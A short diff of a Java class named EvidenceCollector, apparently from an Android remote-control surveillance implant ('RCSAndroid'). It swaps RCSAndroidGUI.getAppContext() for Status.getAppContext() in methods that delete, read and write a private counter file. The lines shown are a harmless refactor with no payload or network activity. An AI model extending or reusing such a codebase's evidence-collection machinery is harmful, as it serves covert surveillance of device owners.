@@ -139,7 +139,7 @@ public class EvidenceCollector {
 		debug.info("Removing Progressive");
 		// #endif
 
-		final Context content = RCSAndroidGUI.getAppContext();
+		final Context content = Status.getAppContext();
 		content.deleteFile(PROG_FILENAME);
 	}
 
@@ -149,7 +149,7 @@ public class EvidenceCollector {
 	 * @return the int
 	 */
 	private synchronized int deserializeProgressive() {
-		final Context content = RCSAndroidGUI.getAppContext();
+		final Context content = Status.getAppContext();
 		int progessive = 0;
 		try {
 			final FileInputStream fos = content.openFileInput(PROG_FILENAME);
@@ -185,7 +185,7 @@ public class EvidenceCollector {
 	protected synchronized int getNewProgressive() {
 		logProgressive++;
 
-		final Context content = RCSAndroidGUI.getAppContext();
+		final Context content = Status.getAppContext();
 		try {
 			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME,
 					Context.MODE_PRIVATE);
